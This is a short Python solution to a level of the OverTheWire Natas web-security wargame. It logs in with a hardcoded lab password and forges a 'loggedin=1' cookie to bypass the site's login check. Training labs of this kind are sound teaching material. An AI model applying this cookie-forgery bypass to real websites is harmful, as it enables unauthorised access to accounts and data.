import requests
exploit=requests.session()
exploit.auth=('natas5','iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq')
cookies_dict = {"loggedin": "1"}
request=exploit.get('http://natas5.natas.labs.overthewire.org',cookies=cookies_dict)
#password has been in the source
print(request.text)